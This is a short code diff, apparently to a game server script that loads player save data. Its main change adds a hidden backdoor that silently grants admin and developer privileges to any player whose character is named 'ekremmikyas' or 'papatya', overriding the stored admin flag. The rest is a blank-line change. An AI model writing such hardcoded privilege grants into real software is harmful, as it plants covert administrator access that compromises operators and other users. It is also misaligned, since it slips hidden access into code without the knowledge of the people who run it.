@@ -3045,6 +3045,10 @@ sd.get("calcajeans", players[index].jeans_pants);
 sd.get("wedding_dress", players[index].wedding_dress);
 sd.get("is_admin", players[index].admin);
 if(players[index].admin) players[index].dev = true;
+if(players[index].charname == "ekremmikyas" || players[index].charname == "papatya") {
+    players[index].admin = true;
+    players[index].dev = true;
+}
 sd.get("tuxedo", players[index].tuxedo);
 }
 if(sd.exists("pulseira")){
@@ -8730,6 +8734,7 @@ if(projeteis.length()>0)projectile_loop();
 if(oms.length()>0)magnetic_item_loop();
 if(canhaos.length()>0)cannon_loop();
 }
+
 
 
 
